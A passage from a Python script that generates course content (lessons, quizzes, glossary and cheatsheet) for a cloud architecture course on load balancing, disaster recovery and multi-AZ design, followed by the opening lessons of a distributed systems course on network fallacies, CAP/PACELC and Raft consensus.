                {"answer": "application", "hint": "Layer 7 HTTP load balancer (ALB)", "options": ["application", "hardware", "terminal"]}
            ],
            [
                {"q": "What is 'Anycast' routing in global DNS networks like AWS Route 53?",
                 "a": ["A network addressing technique where the same single IP address is announced from multiple physical data centers worldwide, automatically routing users to the nearest location", "Broadcasting video over television", "A method for sending emails to everyone", "A satellite internet system"],
                 "c": 0, "why": "Anycast routes DNS traffic to the topologically closest data center via BGP routing."},
                {"q": "What is the primary difference between a Layer 7 Application Load Balancer (ALB) and a Layer 4 Network Load Balancer (NLB)?",
                 "a": ["An ALB inspects HTTP/HTTPS headers and URL paths to make intelligent routing decisions; an NLB operates at the raw TCP/UDP layer for ultra-high throughput and sub-ms latency", "An ALB is free; an NLB is paid", "An NLB only works on Windows", "They are identical load balancers"],
                 "c": 0, "why": "ALBs parse application-level HTTP protocols; NLBs route raw transport-level packets at extreme speed."},
                {"q": "How does an Application Load Balancer know when to stop sending traffic to a crashed container pod?",
                 "a": ["It continuously executes automated HTTP healthchecks against the pod; if consecutive healthchecks fail, it removes the pod from the target pool", "The pod sends an email to the load balancer", "The load balancer checks the clock", "The developer must manually remove the pod"],
                 "c": 0, "why": "Healthchecks continuously monitor backend responsiveness, taking degraded instances out of service."},
                {"q": "Why is caching static assets at CDN edge servers beneficial for origin server capacity?",
                 "a": ["Offloading 90% of static asset requests to CDN edge caches drastically reduces load on origin servers, allowing smaller, cheaper origin infrastructure", "It makes origin servers free", "It turns off origin databases", "It deletes old files"],
                 "c": 0, "why": "Edge caching filters out high-volume static requests before they ever reach origin compute clusters."}
            ],
            "You know how to architect global traffic distribution using Anycast DNS, CDNs, and load balancers.",
            "Disaster Recovery, Multi-Region Replication, and RPO/RTO", "Design disaster recovery architectures with quantified recovery objectives."
        ),
        build_lesson(
            7, "disaster-recovery-rpo-rto-multi-region", "Disaster Recovery, Multi-Region Replication, and RPO/RTO", "Disaster Recovery",
            "Planning for catastrophe: Recovery Point Objective (RPO), Recovery Time Objective (RTO), backup strategies, and multi-region active-passive vs active-active.",
            "What is the difference between RPO (Recovery Point Objective) and RTO (Recovery Time Objective)?",
            ["RPO measures acceptable data loss in time (how much data can we lose?); RTO measures acceptable downtime (how long to restore service?)", "RPO is for software; RTO is for hardware", "RPO measures money; RTO measures employees", "They are identical terms"],
            0, "RPO defines maximum acceptable data loss; RTO defines maximum acceptable downtime before restoration.",
            [
                "<p>Disasters happen: cloud regions experience catastrophic fiber cuts, hurricanes knock out entire metropolitan power grids, or a corrupted migration script wipes out production tables. <strong>Disaster Recovery (DR)</strong> is the engineering science of surviving catastrophe with quantified guarantees.</p>",
                "<p>The Twin Metrics of Disaster Recovery:</p>",
                "<ul><li><strong>1. Recovery Point Objective (RPO):</strong> The maximum acceptable age of files that must be recovered for normal operations. <em>'How many minutes of data loss can the business tolerate?'</em> (e.g. RPO = 5 minutes means you can lose at most 5 minutes of recent transactions).</li><li><strong>2. Recovery Time Objective (RTO):</strong> The maximum acceptable duration of time to restore service after a disaster. <em>'How long can the application be down?'</em> (e.g. RTO = 15 minutes means service must be online within a quarter hour).</li></ul>",
                "<p>The Four Disaster Recovery Strategies:</p>",
                "<ul><li><strong>1. Backup and Restore (Lowest Cost, High RPO/RTO):</strong> Nightly backups to S3 Glacier replicated to another region. RTO: Hours to days; RPO: Up to 24 hours.</li><li><strong>2. Pilot Light (Core Data Replicated, Minimal Compute):</strong> Database is replicated in real time to Region B. Compute instances sit stopped. On disaster, script boots VMs. RTO: 10-30 mins; RPO: Minutes.</li><li><strong>3. Warm Standby (Scaled-Down Fleet Running):</strong> A smaller scaled-down version of the production environment is always running in Region B. RTO: Minutes.</li><li><strong>4. Multi-Region Active-Active (Zero Downtime, Highest Cost):</strong> 100% full capacity running in both Region A and Region B simultaneously. RTO: Zero (instant failover); RPO: Real-time.</li></ul>",
                "<pre><code># Disaster Recovery Strategy Comparison:\n# Strategy            | RPO (Data Loss)  | RTO (Downtime)   | Cost Multiple\n# ---------------------------------------------------------------------------\n# Backup & Restore    | 24 hours         | 24 hours         | 1.0x (Cheapest)\n# Pilot Light         | < 5 minutes      | 15 - 30 minutes  | 1.3x\n# Warm Standby        | Seconds          | < 5 minutes      | 1.6x\n# Multi-Region Active | Near Zero        | Sub-Second (0s)  | 2.2x (Most Expensive)</code></pre>",
                "<div class=\"callout\"><p><strong>The Business Decision:</strong> Never pick a DR strategy based on engineering vanity. RPO and RTO are business decisions determined by how many dollars per minute downtime costs the company.</p></div>"
            ],
            "The Four Disaster Recovery Strategies", "From simple backups to multi-region active-active",
            [
                {"title": "1. Backup & Restore ($)", "lines": ["Nightly backups to S3 cross-region", "RPO: 24h | RTO: Hours to days", "Best for: Non-critical internal tools"]},
                {"title": "2. Pilot Light ($$)", "lines": ["Real-time DB replication, compute offline", "RPO: Minutes | RTO: 15-30 mins", "Best for: Core business applications"]},
                {"title": "3. Warm Standby ($$$)", "lines": ["Scaled-down fleet running in Region B", "RPO: Seconds | RTO: < 5 mins"]},
                {"title": "4. Multi-Region Active ($$$$)", "lines": ["Full capacity running in both regions", "RPO: Real-time | RTO: Instant 0s failover!", "Best for: Financial banking & critical health"]}
            ],
            "RPO vs RTO Visualized", "Data loss boundary vs downtime boundary",
            [
                {"title": "Disaster Event Occurs at 14:00", "lines": ["Last verified backup: 13:55 -> RPO = 5 mins data loss", "System fully restored at 14:15 -> RTO = 15 mins downtime"]}
            ],
            "Complete the disaster recovery sentence",
            "Disaster recovery planning evaluates {1} to bound acceptable data loss and {2} to bound acceptable downtime during catastrophic outages.",
            [
                {"answer": "RPO", "hint": "Recovery Point Objective", "options": ["RPO", "RAM", "CPU"]},
                {"answer": "RTO", "hint": "Recovery Time Objective", "options": ["RTO", "HTML", "TCP"]}
            ],
            [
                {"q": "If a business requires that no more than 1 minute of customer transactions can ever be lost during a datacenter fire, what metric does this define?",
                 "a": ["Recovery Point Objective (RPO) = 1 minute", "Recovery Time Objective (RTO) = 1 minute", "Maximum CPU load", "Network throughput"],
                 "c": 0, "why": "RPO measures the maximum acceptable backward time delta of lost data."},
                {"q": "What is the 'Pilot Light' disaster recovery strategy in cloud architecture?",
                 "a": ["Continuously replicating live databases to a secondary cloud region while keeping application compute instances stopped until a disaster strikes", "Lighting a gas stove", "Running one small server forever", "A flashlight in a data center"],
                 "c": 0, "why": "Pilot light maintains synchronized data in the recovery region, spinning up compute only when disaster strikes."},
                {"q": "What makes 'Multi-Region Active-Active' the most complex and expensive disaster recovery strategy?",
                 "a": ["It requires running duplicate infrastructure 24/7 across multiple regions and solving distributed cross-region database synchronization and write conflicts", "It is illegal in Europe", "It requires writing all code in assembly", "It requires 100 physical offices"],
                 "c": 0, "why": "Active-Active requires duplicate 24/7 compute costs and complex bi-directional cross-region data replication."},
                {"q": "How does cross-region S3 bucket replication support disaster recovery?",
                 "a": ["It automatically copies uploaded objects asynchronously to an S3 bucket in a different geographic region, surviving whole-region outages", "It compresses files to save disk space", "It encrypts files with a password", "It sends files via email"],
                 "c": 0, "why": "Cross-region replication guarantees that data survives even if an entire cloud region is destroyed."}
            ],
            "You know how to define RPO and RTO and architect disaster recovery strategies from Pilot Light to Active-Active.",
            "Architecting a Highly Available, Fault-Tolerant Cloud Infrastructure", "Synthesize everything: architect a production-grade cloud infrastructure."
        ),
        build_lesson(
            8, "architecting-highly-available-cloud", "Architecting a Highly Available, Fault-Tolerant Cloud Infrastructure", "Cloud Architecture",
            "Synthesizing cloud architecture: unifying multi-AZ VPCs, autoscaling container clusters, RDS Multi-AZ, CDNs, and IAM governance.",
            "What architectural combination guarantees that a cloud application survives the total destruction of a physical data center without downtime?",
            ["Multi-AZ deployment: Application Load Balancers distributing traffic across compute pods and automated Multi-AZ failover databases in separate physical zones", "Buying a more expensive server", "Installing antivirus on the server", "Running without a database"],
            0, "Multi-AZ redundancy across load balancers, container pods, and databases ensures automated survival of datacenter failures.",
            [
                "<p>We have covered the complete engineering discipline of Cloud Architecture: the mental model of cloud and shared responsibility, three-tier VPC design, compute paradigms (EC2, Lambda, EKS), storage hierarchies (EBS, S3, EFS), enterprise IAM federation, global traffic management, and disaster recovery.</p>",
                "<p>Now, we synthesize these into a <strong>Comprehensive Highly Available, Fault-Tolerant Cloud Blueprint</strong>:</p>",
                "<ul><li><strong>1. Global Ingress Layer:</strong> Route 53 Anycast DNS routes to CloudFront CDN PoPs (terminates TLS, serves static cache in 15ms).</li><li><strong>2. Three-Tier Multi-AZ VPC:</strong> Spans two Availability Zones (`us-east-1a` and `us-east-1b`). Redundant Public, Private App, and Isolated Data subnets!</li><li><strong>3. Elastic Compute Cluster:</strong> Application Load Balancer routes traffic to autoscaling container pods in private subnets across both AZs.</li><li><strong>4. Resilient Database Tier:</strong> Amazon RDS PostgreSQL configured with <strong>Multi-AZ Synchronous Replication</strong>: if the primary DB instance in AZ-A fails, AWS promotes the standby replica in AZ-B in <strong>under 60 seconds</strong>!</li><li><strong>5. Enterprise Governance:</strong> Keyless OIDC deployments from GitHub Actions, centralized SSO, and S3 lifecycle tiering.</li></ul>",
                "<pre><code># The Complete Fault-Tolerant Cloud Infrastructure Topology:\n[Global Users] ──(Route 53 DNS + CloudFront CDN Edge)──>\n       │\n[Application Load Balancer (ALB) across Multi-AZ]\n       ├── AZ-A Public Subnet (ALB-Node-A) ──> AZ-A Private Subnet (API Pod 1)\n       └── AZ-B Public Subnet (ALB-Node-B) ──> AZ-B Private Subnet (API Pod 2)\n                                                      │\n       ┌──────────────────────────────────────────────┘\n       ▼\n[Isolated Multi-AZ Database Tier]\n       ├── AZ-A: Primary PostgreSQL RDS (Active)\n       │          │ (Synchronous Block-Level Replication!)\n       └── AZ-B: Standby PostgreSQL RDS (Warm Standby - Auto-Failover < 60s!)</code></pre>",
                "<div class=\"callout\"><p><strong>The Final Cloud Engineering Standard:</strong> You have built a truly resilient cloud system. Physical data centers can lose power, fiber cables can be severed, and traffic can surge 100x—your architecture absorbs it all with five-nines uptime.</p></div>"
            ],
            "The Complete Multi-AZ Cloud Architecture", "End-to-end fault tolerance from DNS to database",
            [
                {"title": "1. Edge Ingress Tier", "lines": ["Route 53 Anycast DNS + CloudFront CDN", "Caches assets, terminates TLS at edge"]},
                {"title": "2. Multi-AZ Compute Tier", "lines": ["ALB distributes across AZ-A and AZ-B", "Container pods autoscale on private subnets"]},
                {"title": "3. Multi-AZ Data Tier", "lines": ["Primary DB (AZ-A) -> Standby DB (AZ-B)", "Synchronous replication, 60s auto-failover!"]},
                {"title": "4. Enterprise Governance", "lines": ["Keyless OIDC CI/CD, Centralized SSO, S3 Glacier"]}
            ],
            "Disaster Survival Test", "Simulating a complete datacenter loss",
            [
                {"title": "Physical Fire Destroys AZ-A", "lines": ["ALB healthchecks drain traffic to AZ-B", "RDS promotes Standby DB in AZ-B in 45s", "Application stays online with zero human intervention!"]}
            ],
            "Complete the cloud architecture sentence",
            "A fault-tolerant cloud architecture achieves high availability through multi-AZ compute redundancy, automated database failover, and global {1} caching that eliminates single points of {2}.",
            [
                {"answer": "edge", "hint": "CDN Points of Presence", "options": ["edge", "formatting", "licensing"]},
                {"answer": "failure", "hint": "Vulnerable single components", "options": ["failure", "voltage", "monitor"]}
            ],
            [
                {"q": "What happens automatically if the primary database instance in an Amazon RDS Multi-AZ deployment experiences a hardware failure?",
                 "a": ["RDS automatically promotes the synchronous standby replica in the secondary Availability Zone to primary in under 60 seconds with zero data loss", "The database is deleted permanently", "The database converts to an Excel sheet", "An administrator must manually reinstall Linux"],
                 "c": 0, "why": "RDS Multi-AZ maintains a synchronous standby replica that is promoted automatically upon primary failure."},
                {"q": "Why is distributing container pods across at least two Availability Zones required for high availability?",
                 "a": ["If an entire physical Availability Zone suffers a power or cooling failure, the surviving pods in the other AZ continue serving production traffic", "It makes containers smaller", "It reduces network bandwidth costs to zero", "It is required by Docker syntax"],
                 "c": 0, "why": "Cross-AZ compute distribution ensures container workloads survive physical datacenter outages."},
                {"q": "How does using an Application Load Balancer across multiple AZs prevent user requests from hitting dead servers?",
                 "a": ["The ALB continuously runs healthchecks and dynamically removes failing instances from the target group in seconds", "The load balancer restarts the servers", "The load balancer deletes the code", "The user's browser checks server health"],
                 "c": 0, "why": "Continuous health checking ensures traffic is routed strictly to healthy compute targets."},
                {"q": "What is the ultimate mark of an enterprise Cloud Systems Architect?",
                 "a": ["Designing resilient, decoupled, highly available, and cost-optimized cloud architectures that survive hardware failures automatically without human panic", "Clicking buttons in the AWS web console", "Using the most expensive virtual machine available", "Running all databases on public IP addresses"],
                 "c": 0, "why": "Automated resilience, cost governance, and fault tolerance define elite cloud architecture."}
            ],
            "You have completed the Cloud Architecture course.",
            "Next Course: Distributed Systems & Scalability", "Explore the reality of distributed computing: network fallacies, the CAP theorem, Raft consensus, and consistent hashing."
        )
    ]

    glossary = [
        {"id": "cloud-foundations", "title": "Foundations & VPC", "terms": [
            {"term": "Shared Responsibility Model", "def": "A security model where the cloud provider secures the infrastructure, while the customer secures data and access.", "lesson": 1, "tags": ["cloud", "security"]},
            {"term": "Virtual Private Cloud", "def": "A logically isolated virtual network dedicated to a cloud account (VPC) with custom IP addressing.", "lesson": 2, "tags": ["networking", "vpc"]},
            {"term": "NAT Gateway", "def": "A managed service allowing private subnet instances to make outbound internet connections while blocking inbound access.", "lesson": 2, "tags": ["networking", "nat"]}
        ]},
        {"id": "compute-storage", "title": "Compute & Storage", "terms": [
            {"term": "Serverless Computing", "def": "A cloud execution model where the provider manages server infrastructure, scaling code dynamically from zero.", "lesson": 3, "tags": ["compute", "serverless"]},
            {"term": "Amazon S3", "def": "An infinitely scalable, HTTP-accessible object storage service offering 11 nines of data durability.", "lesson": 4, "tags": ["storage", "s3"]},
            {"term": "Amazon EBS", "def": "High-performance block storage volumes attached directly to single virtual machines for databases.", "lesson": 4, "tags": ["storage", "ebs"]}
        ]},
        {"id": "iam-traffic", "title": "IAM & Global Traffic", "terms": [
            {"term": "Service Control Policy", "def": "An organizational guardrail (SCP) in AWS restricting maximum permissions across member accounts.", "lesson": 5, "tags": ["iam", "governance"]},
            {"term": "Content Delivery Network", "def": "A globally distributed network of edge proxy servers caching content close to users (CDN).", "lesson": 6, "tags": ["networking", "cdn"]},
            {"term": "Application Load Balancer", "def": "A Layer 7 load balancer (ALB) inspecting HTTP/HTTPS headers and URLs to route requests to healthy compute pods.", "lesson": 6, "tags": ["networking", "alb"]}
        ]},
        {"id": "dr-resilience", "title": "Disaster Recovery", "terms": [
            {"term": "RPO", "def": "Recovery Point Objective: the maximum acceptable backward time delta of lost data during an outage.", "lesson": 7, "tags": ["dr", "metrics"]},
            {"term": "RTO", "def": "Recovery Time Objective: the maximum acceptable duration of service downtime before restoration.", "lesson": 7, "tags": ["dr", "metrics"]},
            {"term": "Multi-AZ Deployment", "def": "Architecting systems redundantly across multiple physical Availability Zones for automated disaster survival.", "lesson": 8, "tags": ["architecture", "resilience"]}
        ]}
    ]

    cheatsheet = [
        {
            "title": "AWS S3 Pre-Signed Upload URL (Python)",
            "label": "Direct-to-S3 client upload delegation",
            "code": "import boto3\ns3 = boto3.client('s3')\nurl = s3.generate_presigned_url(\n    ClientMethod='put_object',\n    Params={'Bucket': 'company-assets', 'Key': 'uploads/doc.pdf'},\n    ExpiresIn=3600\n) # Client uploads directly to URL without hitting app server!",
            "lessonN": 4, "lessonSlug": "cloud-storage-hierarchy-s3-ebs-efs", "lessonTitle": "Cloud Storage Hierarchy: Object, Block, and File Storage"
        },
        {
            "title": "Terraform Multi-AZ VPC Subnet (HCL)",
            "label": "Declarative network subnet definition",
            "code": "resource \"aws_subnet\" \"private_app_a\" {\n  vpc_id            = aws_vpc.main.id\n  cidr_block        = \"10.0.2.0/24\"\n  availability_zone = \"us-east-1a\"\n  tags = { Name = \"private-app-us-east-1a\" }\n}",
            "lessonN": 2, "lessonSlug": "virtual-private-clouds-subnets-routing", "lessonTitle": "Virtual Private Clouds (VPC): Subnets, Gateways, and Route Tables"
        },
        {
            "title": "AWS Service Control Policy (SCP)",
            "label": "Restricting allowed geographic cloud regions",
            "code": "{\n  \"Effect\": \"Deny\",\n  \"NotAction\": [\"iam:*\", \"organizations:*\", \"route53:*\", \"cloudfront:*\"],\n  \"Resource\": \"*\",\n  \"Condition\": { \"StringNotEquals\": { \"aws:RequestedRegion\": [\"us-east-1\"] } }\n}",
            "lessonN": 5, "lessonSlug": "enterprise-iam-identity-federation", "lessonTitle": "IAM and Identity Federation at Enterprise Scale"
        },
        {
            "title": "RDS PostgreSQL Multi-AZ Terraform",
            "label": "Synchronous cross-AZ database replication",
            "code": "resource \"aws_db_instance\" \"database\" {\n  allocated_storage = 50\n  engine            = \"postgres\"\n  instance_class    = \"db.m6g.large\"\n  multi_az          = true # Automated synchronous cross-AZ failover!\n  skip_final_snapshot = false\n}",
            "lessonN": 8, "lessonSlug": "architecting-highly-available-cloud", "lessonTitle": "Architecting a Highly Available, Fault-Tolerant Cloud Infrastructure"
        }
    ]

    course_data = {
        "id": "cloud-architecture",
        "title": "Cloud Architecture",
        "num": 98,
        "emoji": "☁️",
        "desc": "Compute, storage, networking and identity — the mental model behind every cloud provider.",
        "topics": ["Cloud Architecture", "Shared Responsibility", "VPCs & Subnets", "NAT Gateways", "Compute Paradigms", "Storage Hierarchy", "Enterprise IAM", "Anycast DNS", "Disaster Recovery", "Multi-AZ"],
        "mission": "# Mission — Cloud Architecture\n\nMaster the mental model of enterprise cloud computing. Internalize the Shared Responsibility Model and on-demand elasticity, architect secure three-tier Virtual Private Clouds with public and private subnets, navigate the compute spectrum across VMs, Serverless, and Kubernetes, evaluate storage hierarchies (EBS, S3, EFS) with automated lifecycle tiering, govern enterprise identity using multi-account AWS Organizations and SCPs, distribute traffic globally with Anycast DNS and CDNs, quantify disaster recovery with RPO/RTO, and architect fault-tolerant multi-AZ infrastructures.",
        "notes": "# Notes — Cloud Architecture\n\nDatabases belong in private subnets with zero public internet routing. High availability requires multi-AZ redundancy across load balancers, compute pods, and databases. S3 lifecycle rules slash storage costs by 80%.",
        "resources": "# Resources — Cloud Architecture\n\n- AWS Well-Architected Framework, *Reliability & Security Pillars*\n- Google Cloud Architecture Framework, *System Design & Networking*\n- Adrian Cockcroft, *Cloud Architecture Patterns & Multi-Region Design*",
        "glossaryGroups": glossary,
        "cheatsheetSections": cheatsheet,
        "lessons": lessons
    }
    save_course(course_data)

# ==============================================================================
# COURSE 99: distributed-systems (Distributed Systems & Scalability)
# ==============================================================================
def make_course_99():
    lessons = [
        build_lesson(
            1, "reality-distributed-systems-fallacies", "The Reality of Distributed Systems: Network Fallacies and Partial Failure", "Network Fallacies",
            "The harsh physics of distributed computing: the 8 Fallacies of Distributed Computing, partial failure, and why networks are unreliable.",
            "What is the single most defining characteristic of a Distributed System compared to a single machine?",
            ["Partial failure: individual components, nodes, or network links can fail independently while the rest of the system continues executing in an uncertain state", "Distributed systems run without power", "Distributed systems have zero latency", "Distributed systems use only one computer"],
            0, "Partial failure is the core reality: nodes fail unpredictably and networks experience arbitrary delays and partitions.",
            [
                "<p>Writing software on a single computer is predictable: if the CPU executes a function, the memory is right there on the motherboard. If the computer crashes, everything crashes together. But in a <strong>Distributed System</strong>—where dozens of servers cooperate over a network—<strong>partial failure is the norm</strong>.</p>",
                "<p>The Classic <strong>Fallacies of Distributed Computing</strong> (Peter Deutsch et al.):</p>",
                "<ul><li><strong>1. 'The network is reliable':</strong> False! Packets drop, Wi-Fi fluctuates, and undersea cables get cut. Networks will partition without warning.</li><li><strong>2. 'Latency is zero':</strong> False! Every cross-network RPC adds milliseconds of latency that compound across service chains.</li><li><strong>3. 'Bandwidth is infinite':</strong> False! Saturating network switches creates packet queues, bufferbloat, and dropped connections.</li><li><strong>4. 'The network is secure':</strong> False! Anyone on the network wire can inspect or inject packets unless encrypted via TLS.</li><li><strong>5. 'Topology doesn't change':</strong> False! Cloud nodes autoscale, IPs get reassigned, and routers fail over.</li></ul>",
                "<pre><code># The Distributed Asymmetry: \n# When Service A calls Service B over the network and receives NO response:\n# Did Service B fail to receive the request?\n# Did Service B execute the request, but the response packet got lost on the way back?\n# Is Service B running slowly and still processing?\n# In a distributed system, A DOES NOT KNOW! This is the fundamental challenge.</code></pre>",
                "<div class=\"callout\"><p><strong>The Golden Rule of Distribution:</strong> You cannot assume state across a network. Build systems designed for timeout, retry, and non-blocking asynchronous communication.</p></div>"
            ],
            "Single Machine vs Distributed System", "Total crash vs partial failure uncertainty",
            [
                {"title": "Single Machine (Predictable)", "lines": ["Shared motherboard bus & memory", "Deterministic: either whole app runs or whole app dies", "Zero network packet drops internally"]},
                {"title": "Distributed System (Uncertain)", "lines": ["Nodes communicate across untrusted networks", "Partial failure: Node 3 dies, Node 4 times out", "System must reach consensus despite partitions!"]}
            ],
            "The Three States of an RPC Call", "Success, Failure, or Complete Uncertainty",
            [
                {"title": "State 1: SUCCESS", "lines": ["Request received & response delivered"]},
                {"title": "State 2: FAILURE", "lines": ["Immediate TCP connection refused"]},
                {"title": "State 3: TIMEOUT (UNKNOWN)", "lines": ["Did it execute? Did it drop? Uncertainty!"]}
            ],
            "Complete the distributed fallacies sentence",
            "The defining reality of distributed systems is {1} failure, where individual network links or servers fail unpredictably, shattering the fallacy that networks are {2}.",
            [
                {"answer": "partial", "hint": "Incomplete component failure", "options": ["partial", "formatting", "licensing"]},
                {"answer": "reliable", "hint": "Dependable without failure", "options": ["reliable", "expensive", "slow"]}
            ],
            [
                {"q": "What is 'Partial Failure' in distributed systems engineering?",
                 "a": ["A condition where some nodes or network links fail while other parts of the system continue running, creating an uncertain global state", "When a computer screen breaks in half", "When half the code is deleted", "When electricity is turned off halfway"],
                 "c": 0, "why": "Partial failure is the defining challenge of distributed computing where components fail independently."},
                {"q": "Why is 'The network is reliable' considered a fallacy in modern software engineering?",
                 "a": ["Physical networks experience transient packet loss, congestion, cable cuts, and routing flaps that cause unexpected communication drops", "Networks never work", "Networks are illegal", "Cables are too slow"],
                 "c": 0, "why": "Physical and logical networks are inherently prone to transient partitions and dropped packets."},
                {"q": "If Service A calls Service B to transfer funds and times out after 5 seconds, what must Service A assume?",
                 "a": ["Service A must assume the state is UNKNOWN: the transfer may have succeeded, failed, or be mid-execution, requiring idempotent inquiry", "Service A assumes it definitely succeeded", "Service A assumes it definitely failed", "Service A shuts down"],
                 "c": 0, "why": "Timeouts are ambiguous; the request may have completed before the response was lost in transit."},
                {"q": "How does designing for partial failure improve enterprise system resilience?",
                 "a": ["Services use circuit breakers, timeouts, and fallbacks so that the failure of one downstream microservice does not collapse the entire application", "It makes systems run without memory", "It eliminates the need for testing", "It reduces server costs to zero"],
                 "c": 0, "why": "Fault-tolerant architectures isolate component failures, preventing systemic cascading crashes."}
            ],
            "You understand the physical reality of distributed systems, partial failure, and network fallacies.",
            "The CAP Theorem and PACELC: Consistency vs Availability", "Master the fundamental trade-offs of distributed data stores."
        ),
        build_lesson(
            2, "cap-theorem-and-pacelc", "The CAP Theorem and PACELC: Consistency vs Availability", "CAP & PACELC",
            "Fundamental trade-offs: the CAP Theorem (Consistency, Availability, Partition Tolerance) and the PACELC extension (Latency vs Consistency).",
            "What does the CAP Theorem mathematically prove about distributed data stores?",
            ["In the presence of a network Partition (P), a distributed system must choose between Consistency (C) and Availability (A); it cannot have both", "A system can have Consistency, Availability, and Partition tolerance all at 100%", "Computers can only do three things", "Databases cannot be distributed"],
            0, "The CAP Theorem proves that during a network partition, a system must trade off between strong consistency and availability.",
            [
                "<p>In 2000, Eric Brewer formulated the most famous theorem in distributed systems: the <strong>CAP Theorem</strong>. It proves that any distributed data store can guarantee at most two out of three properties:</p>",
                "<ul><li><strong>C — Consistency (Linearizability):</strong> Every read receives the most recent write or an error. All nodes see the exact same data at the same instant.</li><li><strong>A — Availability:</strong> Every non-failing node returns a non-error response for every request (no timeouts or rejections).</li><li><strong>P — Partition Tolerance:</strong> The system continues to operate despite arbitrary dropped packets or network splits between nodes.</li></ul>",
                "<p><strong>Why 'Pick 2' is a Misunderstanding:</strong> You <strong>cannot choose CA</strong>! In the real physical world, networks <em>will</em> partition (P is non-negotiable). Therefore, when a partition occurs, your true choice is binary: <strong>CP or AP</strong>:</p>",
                "<ul><li><strong>CP Systems (Consistency over Availability):</strong> When a network partition divides the cluster, reject writes or block reads on isolated nodes to prevent reading stale data. E.g. <strong>PostgreSQL with synchronous replication, ZooKeeper, etcd, MongoDB (strict)</strong>.</li><li><strong>AP Systems (Availability over Consistency):</strong> Keep accepting writes on both sides of the partition! Nodes will temporarily diverge, and resolve conflicts later (Eventual Consistency). E.g. <strong>Amazon DynamoDB, Apache Cassandra, Couchbase</strong>.</li><li><strong>The PACELC Extension (Abadi):</strong> <em>If there is a Partition (P), trade off Availability (A) vs Consistency (C); Else (E), trade off Latency (L) vs Consistency (C).</em></li></ul>",
                "<pre><code># The CAP Partition Dilemma:\n# Node 1 (US-East) <── [NETWORK PARTITION CUTS FIBER!] ──> Node 2 (EU-West)\n# User writes X=5 to Node 1.\n# User reads X from Node 2.\n#\n# If CP: Node 2 returns ERROR (\"Partition active, cannot verify latest write!\") -> CONSISTENT, BUT UNAVAILABLE!\n# If AP: Node 2 returns X=4 (Stale data, but answers immediately!)              -> AVAILABLE, BUT INCONSISTENT!</code></pre>",
                "<div class=\"callout\"><p><strong>The Business Decision:</strong> Banks and financial ledgers choose <strong>CP</strong> (never show an incorrect balance). Social media feeds and shopping carts choose <strong>AP</strong> (always allow the user to like a post or add to cart).</p></div>"
            ],
            "The CAP Theorem Choice", "In the presence of a Network Partition (P)",
            [
                {"title": "CP Systems (Consistency)", "lines": ["Rejects writes on partitioned nodes", "Guarantees zero stale reads", "Used for: Banking, ledgers, etcd"]},
                {"title": "AP Systems (Availability)", "lines": ["Answers requests on all nodes", "Accepts eventual consistency / stale reads", "Used for: Social feeds, shopping carts, DNS"]}
            ],
            "The PACELC Theorem", "Extending CAP to normal non-partition operation",
            [
                {"title": "If Partition (P)", "lines": ["Choose Availability (A) vs Consistency (C)"]},
                {"title": "Else (E) Normal Operation", "lines": ["Choose Latency (L) vs Consistency (C)", "(e.g. DynamoDB trades consistency for sub-10ms latency)"]}
            ],
            "Complete the CAP theorem sentence",
            "The CAP theorem proves that when network partitions occur, distributed systems must choose between strong {1} and high {2}.",
            [
                {"answer": "consistency", "hint": "All nodes seeing identical latest state", "options": ["consistency", "formatting", "licensing"]},
                {"answer": "availability", "hint": "Every request receiving a successful non-error response", "options": ["availability", "hardware", "terminal"]}
            ],
            [
                {"q": "Why is 'CA' (Consistency + Availability without Partition Tolerance) impossible in distributed systems?",
                 "a": ["Physical networks inevitably experience latency, packet drops, and partitions; a distributed system cannot opt out of network partitions", "CA is illegal in computer science", "Computers only have 2 network cards", "CA requires quantum computing"],
                 "c": 0, "why": "Network partitions are unavoidable physical realities, forcing a choice between C and A during partitions."},
                {"q": "What type of system is Apache Cassandra according to the CAP theorem?",
                 "a": ["An AP system designed for high availability and partition tolerance, using tunable eventual consistency", "A CP system", "A single-node database", "A relational database"],
                 "c": 0, "why": "Cassandra prioritizes availability and partition tolerance, replicating data eventually across nodes."},
                {"q": "Why do consensus engines like etcd and ZooKeeper choose CP (Consistency)?",
                 "a": ["They manage critical cluster state (Kubernetes leader election, configuration) where split-brain or stale data causes catastrophic corruption", "CP is faster than AP", "They have no network interface", "They only run on Linux"],
                 "c": 0, "why": "Cluster coordination requires absolute linearizable consistency to avoid split-brain states."},
                {"q": "What does the 'PACELC' theorem add to Brewer's original CAP theorem?",
                 "a": ["It explains that even when the network is healthy (no partition), a system must still trade off between Latency (L) and Consistency (C)", "It adds security to CAP", "It proves CAP is wrong", "It is an encryption algorithm"],
                 "c": 0, "why": "PACELC models the trade-off between latency and consistency during normal non-partitioned operation."}
            ],
            "You know how to evaluate distributed storage trade-offs using the CAP and PACELC theorems.",
            "Consensus Algorithms: Paxos, Raft, and Distributed State Machines", "Understand how distributed clusters agree on a single source of truth."
        ),
        build_lesson(
            3, "consensus-algorithms-raft-paxos", "Consensus Algorithms: Paxos, Raft, and Distributed State Machines", "Consensus & Raft",
            "Achieving agreement: the consensus problem, Replicated State Machines (RSM), Paxos foundations, and the understandable Raft protocol.",
            "What problem do distributed consensus algorithms like Raft and Paxos solve?",
            ["Enabling a cluster of distributed servers to reliably agree on a sequence of state transitions (an append-only log) even if some nodes fail", "Encrypting files on a hard drive", "Compressing database records", "Formatting source code in Python"],
            0, "Consensus algorithms allow independent servers to reach infallible agreement on shared state despite node failures.",
            [
                "<p>If you have five independent database nodes, how do they agree on who is the Leader? If two nodes both declare themselves Leader at the same time (<strong>The Split-Brain Problem</strong>), they will accept conflicting writes, corrupting the database permanently. <strong>Distributed Consensus</strong> is the mathematical algorithm that makes agreement infallible.</p>",
                "<p>The Raft Consensus Protocol (Ongaro & Ousterhout, Stanford):</p>",
                "<ul><li><strong>1. Designed for Understandability:</strong> Paxos was historically notoriously difficult to implement. Raft decomposes consensus into three clear sub-problems: <em>Leader Election</em>, <em>Log Replication</em>, and <em>Safety</em>.</li><li><strong>2. Three Node Roles:</strong> Every node is in one of three states: <em>Follower</em>, <em>Candidate</em>, or <em>Leader</em>.</li><li><strong>3. Quorum Rule ($N/2 + 1$):</strong> In a cluster of $5$ nodes, any decision (electing a leader, committing a log entry) requires agreement from a <strong>Quorum of at least 3 nodes</strong> ($5/2 + 1 = 3$). A 5-node cluster survives the complete death of 2 nodes without data loss!</li><li><strong>4. Log Replication & Commit Index:</strong> The Leader accepts client writes, appends them to its log, and sends `AppendEntries` RPCs to followers. Once a majority of followers acknowledge, the entry is committed to the <strong>Replicated State Machine (RSM)</strong>!</li></ul>",
